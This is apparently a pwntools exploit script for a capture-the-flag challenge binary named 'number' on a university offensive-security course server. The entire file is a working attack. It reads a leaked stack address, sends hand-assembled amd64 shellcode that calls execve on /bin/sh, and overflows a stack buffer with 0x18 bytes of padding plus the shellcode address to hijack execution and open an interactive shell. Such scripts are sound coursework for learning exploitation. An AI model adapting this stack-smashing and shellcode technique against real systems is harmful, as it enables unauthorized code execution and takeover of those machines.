from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./number"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # continue
    # ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1291)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

libc = ELF(libc, checksec=False)
# bin_sh_offset = next(libc.search(b"/bin/sh"))

p.recvuntil(b'here: ')
shellcode_address = int(p.recvline().strip(), 16) + 0x8
print(f'shellcode address: {hex(shellcode_address)}')

p.recvuntil("> ")
shell_code_string = int.from_bytes('/bin/sh'.encode(), byteorder='little')

shell_code = f'''
mov rax, {hex(shell_code_string)}
push rax
mov rsi, rsp
mov rdx, 0x0
lea rdi, [rsp]
lea rsi, [0x0]
mov rax, rdi
mov rax, 0x3b
syscall
'''
print(f'Shell code: {shell_code}')
shellcode = asm(shell_code)
print(f'Shellcode length: {len(shellcode)}')
p.sendline(shellcode)

p.recvuntil("> ")
target_stack_offset = 0x18
print(f'buf_stack_offset: {target_stack_offset}')
p.sendline((b'B' * target_stack_offset) + p64(shellcode_address))
p.interactive()
